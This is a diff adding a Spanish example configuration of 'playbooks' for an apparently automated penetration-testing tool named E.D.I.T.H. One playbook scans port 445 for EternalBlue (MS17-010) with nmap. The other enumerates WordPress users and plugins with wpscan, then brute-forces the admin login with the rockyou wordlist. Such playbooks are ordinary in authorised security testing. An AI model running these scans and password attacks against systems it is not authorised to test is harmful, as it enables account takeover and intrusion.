@@ -1,0 +1,32 @@
+# Playbooks personalizados para E.D.I.T.H
+# Copia este archivo y añade tus propios playbooks
+
+# Ejemplo: Verificar si un dispositivo es vulnerable a EternalBlue (MS17-010)
+name: "Verificación EternalBlue"
+description: "Verifica si el objetivo es vulnerable a EternalBlue (MS17-010)"
+conditions:
+  - service: "microsoft-ds"
+    port: 445
+steps:
+  - command: "nmap --script smb-vuln-ms17-010 -p 445 {target}"
+    description: "Verificación de vulnerabilidad MS17-010"
+    delay: 2
+    timeout: 60
+
+# Ejemplo: Atacar WordPress
+name: "Ataque WordPress"
+description: "Escanea y explota vulnerabilidades comunes de WordPress"
+conditions:
+  - service: "http"
+    port: 80
+  - service: "https"
+    port: 443
+steps:
+  - command: "wpscan --url http://{target} -e vp,vt,u"
+    description: "Escaneo de vulnerabilidades WordPress"
+    delay: 3
+    timeout: 180
+  - command: "wpscan --url http://{target} -U admin -P /usr/share/wordlists/rockyou.txt"
+    description: "Fuerza bruta de login WordPress"
+    delay: 5
+    timeout: 300
